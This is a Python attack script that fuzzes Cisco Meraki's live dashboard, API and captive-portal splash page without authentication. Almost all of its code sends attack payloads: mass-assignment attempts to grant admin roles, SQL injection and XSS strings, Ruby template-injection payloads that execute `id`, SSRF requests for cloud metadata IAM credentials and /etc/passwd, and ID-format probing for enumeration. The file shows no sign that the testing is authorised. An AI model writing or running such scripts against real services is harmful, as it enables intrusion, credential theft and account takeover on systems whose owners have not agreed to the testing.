#!/usr/bin/env python3
"""
Meraki Fuzz Engineer - Round 1: Edge-case attack surface on high-risk sinks
Targets: A) Rails Dashboard, B) API, C) Splash Page
Generated: 2026-08-22 CDC Round 1
"""

import requests
import json
import time
import sys
from urllib.parse import urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
DASHBOARD_BASE = "https://n88.dashboard.meraki.com"
API_BASE = "https://api.meraki.com/api/v1"
SPLASH_BASE = "https://n88.network-auth.com"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Accept': 'application/json, text/html, */*',
})

# ============================================================
# TARGET A: Rails Dashboard
# ============================================================

def test_rails_param_pollution():
    """Test parameter pollution: array vs hash confusion"""
    findings = []
    base = f"{DASHBOARD_BASE}/login/email_lookup"
    
    payloads = [
        {'email': 'test@example.com', 'email[]': 'polluted@example.com'},
        {'email': ['test@example.com', 'polluted@example.com']},
        {'email': 'test@example.com', 'email[0]': 'polluted@example.com'},
        {'utf8': '✓', 'authenticity_token': 'x', 'email': 'test@example.com', 'email[]': 'x'},
        {'email': 'test@example.com', 'goto': 'manage', 'go': '/', 'sh': '88', 'email[1]': 'x'},
    ]
    
    for i, p in enumerate(payloads):
        try:
            r = session.post(base, data=p, allow_redirects=False, timeout=10)
            findings.append({
                'sink': 'Rails Dashboard: /login/email_lookup',
                'edge_case': f'Param pollution array vs hash #{i+1}',
                'payload': str(p)[:200],
                'status': r.status_code,
                'behavior': 'redirect' if r.status_code in [302, 303] else 'error' if r.status_code >= 400 else 'ok',
                'pre_auth': True
            })
        except Exception as e:
            findings.append({
                'sink': 'Rails Dashboard: /login/email_lookup',
                'edge_case': f'Param pollution array vs hash #{i+1}',
                'error': str(e),
                'pre_auth': True
            })
    return findings


def test_rails_mass_assignment():
    """Test mass assignment via permit vs require"""
    findings = []
    base = f"{DASHBOARD_BASE}/login/email_lookup"
    
    payloads = [
        {'email': 'test@example.com', 'admin': 'true', 'role': 'super_admin'},
        {'email': 'test@example.com', 'user[admin]': 'true', 'user[role]': 'super_admin'},
        {'email': 'test@example.com', 'organization_id': '12345', 'network_id': 'N_12345'},
        {'email': 'test@example.com', '_method': 'patch', 'email': 'admin@example.com'},
        {'email': 'test@example.com', 'id': '1', 'email': 'takeover@example.com'},
    ]
    
    for i, p in enumerate(payloads):
        try:
            r = session.post(base, data=p, allow_redirects=False, timeout=10)
            findings.append({
                'sink': 'Rails Dashboard: /login/email_lookup',
                'edge_case': f'Mass assignment attempt #{i+1}',
                'payload': str(p)[:200],
                'status': r.status_code,
                'behavior': 'redirect' if r.status_code in [302, 303] else 'error' if r.status_code >= 400 else 'ok',
                'pre_auth': True
            })
        except Exception as e:
            findings.append({
                'sink': 'Rails Dashboard: /login/email_lookup',
                'edge_case': f'Mass assignment attempt #{i+1}',
                'error': str(e),
                'pre_auth': True
            })
    return findings


def test_rails_type_confusion():
    """Test type confusion: string vs integer IDs"""
    findings = []
    # Test endpoints that accept IDs
    test_endpoints = [
        f"{DASHBOARD_BASE}/networks/12345",
        f"{DASHBOARD_BASE}/organizations/12345",
        f"{DASHBOARD_BASE}/devices/12345",
    ]
    
    id_variants = [
        "12345",           # string
        12345,             # integer
        "012345",          # leading zero
        "0",               # zero
        "-1",              # negative
        "999999999999999999999999999999",  # overflow
        "",                # empty
        "abc",             # non-numeric
        "1 OR 1=1",        # SQLi attempt
        "<script>alert(1)</script>",  # XSS attempt
    ]
    
    for endpoint in test_endpoints:
        for vid in id_variants:
            test_url = f"{endpoint}/{vid}" if not endpoint.endswith('/') else f"{endpoint}{vid}"
            try:
                r = session.get(test_url, timeout=10)
                findings.append({
                    'sink': f'Rails Dashboard: {endpoint}',
                    'edge_case': f'Type confusion ID variant: {str(vid)[:50]}',
                    'status': r.status_code,
                    'behavior': 'redirect' if r.status_code in [302, 303] else 'error' if r.status_code >= 400 else 'ok',
                    'pre_auth': True
                })
            except Exception as e:
                findings.append({
                    'sink': f'Rails Dashboard: {endpoint}',
                    'edge_case': f'Type confusion ID variant: {str(vid)[:50]}',
                    'error': str(e),
                    'pre_auth': True
                })
    return findings


# ============================================================
# TARGET B: API
# ============================================================

def test_api_format_oracle():
    """Test IDOR format oracle on API endpoints"""
    findings = []
    
    # Test orgId format oracle
    test_org_ids = [
        "12345",      # 5 digits - should be invalid format
        "123456",     # 6 digits - valid format
        "1234567",    # 7 digits - valid format
        "12345678",   # 8 digits - invalid format
        "999999",     # 6 digits
        "1000000",    # 7 digits
    ]
    
    for org_id in test_org_ids:
        endpoints = [
            f"{API_BASE}/organizations/{org_id}",
            f"{API_BASE}/organizations/{org_id}/networks",
            f"{API_BASE}/organizations/{org_id}/devices",
        ]
        
        for ep in endpoints:
            try:
                r = requests.get(ep, timeout=10)
                findings.append({
                    'sink': f'API: {ep}',
                    'edge_case': f'orgId format oracle: {org_id}',
                    'status': r.status_code,
                    'response': r.text[:200] if r.text else '',
                    'format_oracle': 'valid' if 'Invalid API key' in r.text else 'invalid' if 'No valid authentication method found' in r.text else 'unknown',
                    'pre_auth': True
                })
            except Exception as e:
                findings.append({
                    'sink': f'API: {ep}',
                    'edge_case': f'orgId format oracle: {org_id}',
                    'error': str(e),
                    'pre_auth': True
                })
    return findings


def test_api_param_pollution():
    """Test parameter pollution on API endpoints"""
    findings = []
    base = f"{API_BASE}/organizations"
    
    payloads = [
        {'per_page': '100', 'per_page[]': '999999'},
        {'per_page': ['100', '999999']},
        {'starting_after': 'cursor', 'starting_after[]': 'other'},
        {'fields[]': 'id', 'fields': 'name,serial'},
    ]
    
    for i, p in enumerate(payloads):
        try:
            r = requests.get(base, params=p, timeout=10)
            findings.append({
                'sink': f'API: {base}',
                'edge_case': f'Parameter pollution #{i+1}',
                'payload': str(p)[:200],
                'status': r.status_code,
                'response': r.text[:200] if r.text else '',
                'pre_auth': True
            })
        except Exception as e:
            findings.append({
                'sink': f'API: {base}',
                'edge_case': f'Parameter pollution #{i+1}',
                'error': str(e),
                'pre_auth': True
            })
    return findings


def test_api_pagination_bypass():
    """Test pagination bypass with large per_page"""
    findings = []
    base = f"{API_BASE}/organizations"
    
    per_page_values = ['100', '1000', '10000', '999999', '-1', '0', 'abc']
    
    for pp in per_page_values:
        try:
            r = requests.get(base, params={'per_page': pp}, timeout=10)
            findings.append({
                'sink': 'API: /organizations',
                'edge_case': f'Pagination bypass per_page={pp}',
                'status': r.status_code,
                'response': r.text[:200] if r.text else '',
                'pre_auth': True
            })
        except Exception as e:
            findings.append({
                'sink': 'API: /organizations',
                'edge_case': f'Pagination bypass per_page={pp}',
                'error': str(e),
                'pre_auth': True
            })
    return findings


# ============================================================
# TARGET C: Splash Page
# ============================================================

def test_splash_template_injection():
    """Test SSTI on splash page parameters"""
    findings = []
    base = f"{SPLASH_BASE}/splash"
    
    # Template injection payloads
    ssti_payloads = [
        '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>',
        '{{config}}', '{{request}}', '{{self}}',
        '{{"".class.ancestors.first.module_exec { `id` }}}',
        '${"".class.ancestors.first.module_exec { `id` }}',
    ]
    
    base_params = {
        'base_grant_url': 'https://example.com/grant',
        'user_continue_url': 'https://example.com/continue',
        'node_mac': '00:11:22:33:44:55',
        'client_ip': '1.2.3.4',
        'client_mac': 'aa:bb:cc:dd:ee:ff',
        'network_id': '12345',
        'camera_serial': 'TEST123',
        'api_key': 'test',
    }
    
    for payload in ssti_payloads:
        test_params = base_params.copy()
        test_params['base_grant_url'] = payload
        test_params['user_continue_url'] = payload
        
        try:
            r = requests.get(SPLASH_BASE + "/splash", params=test_params, timeout=10)
            findings.append({
                'sink': 'Splash Page: /splash',
                'edge_case': f'SSTI payload: {payload[:50]}',
                'status': r.status_code,
                'response': r.text[:200] if r.text else '',
                'waf_blocked': r.status_code == 403,
                'pre_auth': True
            })
        except Exception as e:
            findings.append({
                'sink': 'Splash Page: /splash',
                'edge_case': f'SSTI payload: {payload[:50]}',
                'error': str(e),
                'pre_auth': True
            })
    return findings


def test_splash_ssrf():
    """Test SSRF via splash page parameters"""
    findings = []
    
    # SSRF payloads - only client-side redirect expected
    ssrf_payloads = [
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://localhost:8080/',
        'http://127.0.0.1:8080/',
        'file:///etc/passwd',
        'ldap://localhost:389/',
        'dict://localhost:11211/',
        'gopher://localhost:25/',
    ]
    
    base_params = {
        'base_grant_url': 'https://example.com/grant',
        'user_continue_url': 'https://example.com/continue',
        'node_mac': '00:11:22:33:44:55',
        'client_ip': '1.2.3.4',
        'client_mac': 'aa:bb:cc:dd:ee:ff',
    }
    
    for payload in ssrf_payloads:
        test_params = base_params.copy()
        test_params['base_grant_url'] = payload
        test_params['user_continue_url'] = payload
        
        try:
            r = requests.get(SPLASH_BASE + "/splash", params=test_params, timeout=10)
            findings.append({
                'sink': 'Splash Page: /splash (SSRF)',
                'edge_case': f'SSRF payload: {payload[:80]}',
                'status': r.status_code,
                'response': r.text[:200] if r.text else '',
                'waf_blocked': r.status_code == 403,
                'ssrf_fetched': 'Meraki-ASN' in r.headers.get('Server', '') or 'cloudflare' not in r.headers.get('Server', '').lower(),
                'pre_auth': True
            })
        except Exception as e:
            findings.append({
                'sink': 'Splash Page: /splash (SSRF)',
                'edge_case': f'SSRF payload: {payload[:80]}',
                'error': str(e),
                'pre_auth': True
            })
    return findings


def test_splash_parameter_pollution():
    """Test parameter pollution on splash page"""
    findings = []
    base_params = {
        'base_grant_url': 'https://example.com/grant',
        'user_continue_url': 'https://example.com/continue',
        'node_mac': '00:11:22:33:44:55',
        'client_ip': '1.2.3.4',
        'client_mac': 'aa:bb:cc:dd:ee:ff',
    }
    
    pollution_tests = [
        ({'base_grant_url': 'https://a.com', 'base_grant_url[]': 'https://b.com'}, 'array pollution'),
        ({'base_grant_url': ['https://a.com', 'https://b.com']}, 'array param'),
        ({'node_mac': '00:11:22:33:44:55', 'node_mac[]': '66:77:88:99:AA:BB'}, 'node_mac pollution'),
        ({'client_ip': '1.2.3.4', 'client_ip[]': '5.6.7.8'}, 'client_ip pollution'),
    ]
    
    for params, desc in pollution_tests:
        test_params = base_params.copy()
        test_params.update(params)
        
        try:
            r = requests.get(SPLASH_BASE + "/splash", params=test_params, timeout=10)
            findings.append({
                'sink': 'Splash Page: /splash (param pollution)',
                'edge_case': desc,
                'status': r.status_code,
                'response': r.text[:200] if r.text else '',
                'waf_blocked': r.status_code == 403,
                'pre_auth': True
            })
        except Exception as e:
            findings.append({
                'sink': 'Splash Page: /splash (param pollution)',
                'edge_case': desc,
                'error': str(e),
                'pre_auth': True
            })
    return findings


def test_splash_malformed_inputs():
    """Test malformed MAC, IP, URL formats"""
    findings = []
    base_params = {
        'base_grant_url': 'https://example.com/grant',
        'user_continue_url': 'https://example.com/continue',
    }
    
    malformed_tests = [
        # MAC address variants
        ('00:11:22:33:44:55', 'valid MAC colon'),
        ('00-11-22-33-44-55', 'valid MAC dash'),
        ('001122334455', 'valid MAC no separator'),
        ('00:11:22:33:44', 'short MAC'),
        ('00:11:22:33:44:55:66', 'long MAC'),
        ('GG:HH:II:JJ:KK:LL', 'invalid hex MAC'),
        ('', 'empty MAC'),
        # IP variants
        ('1.2.3.4', 'valid IPv4'),
        ('256.256.256.256', 'invalid IPv4'),
        ('192.168.1.1/24', 'CIDR'),
        ('::1', 'IPv6 localhost'),
        ('fe80::1%eth0', 'IPv6 link-local'),
        # URL variants
        ('https://example.com', 'valid HTTPS'),
        ('http://example.com', 'valid HTTP'),
        ('javascript:alert(1)', 'javascript: URI'),
        ('data:text/html,<script>alert(1)</script>', 'data: URI'),
        ('//example.com', 'protocol-relative'),
        ('/path', 'relative path'),
    ]
    
    for value, desc in malformed_tests:
        for param in ['base_grant_url', 'user_continue_url', 'node_mac', 'client_ip', 'client_mac']:
            test_params = base_params.copy()
            test_params[param] = value
            
            try:
                r = requests.get(SPLASH_BASE + "/splash", params=test_params, timeout=10)
                findings.append({
                    'sink': f'Splash Page: /splash ({param})',
                    'edge_case': f'Malformed {desc}: {value[:50]}',
                    'status': r.status_code,
                    'response': r.text[:200] if r.text else '',
                    'waf_blocked': r.status_code == 403,
                    'pre_auth': True
                })
            except Exception as e:
                findings.append({
                    'sink': f'Splash Page: /splash ({param})',
                    'edge_case': f'Malformed {desc}: {value[:50]}',
                    'error': str(e),
                    'pre_auth': True
                })
    return findings


# ============================================================
# MAIN
# ============================================================

def run_all_tests():
    all_findings = []
    
    print("[*] Testing Rails Dashboard...")
    all_findings.extend(test_rails_param_pollution())
    all_findings.extend(test_rails_mass_assignment())
    all_findings.extend(test_rails_type_confusion())
    
    print("[*] Testing API...")
    all_findings.extend(test_api_format_oracle())
    all_findings.extend(test_api_param_pollution())
    all_findings.extend(test_api_pagination_bypass())
    
    print("[*] Testing Splash Page...")
    all_findings.extend(test_splash_template_injection())
    all_findings.extend(test_splash_ssrf())
    all_findings.extend(test_splash_parameter_pollution())
    all_findings.extend(test_splash_malformed_inputs())
    
    # Save findings
    output = {
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'total_findings': len(all_findings),
        'findings': all_findings
    }
    
    with open('meraki_fuzz_findings.json', 'w') as f:
        json.dump(output, f, indent=2)
    
    print(f"[+] Saved {len(all_findings)} findings to meraki_fuzz_findings.json")
    return all_findings


if __name__ == "__main__":
    run_all_tests()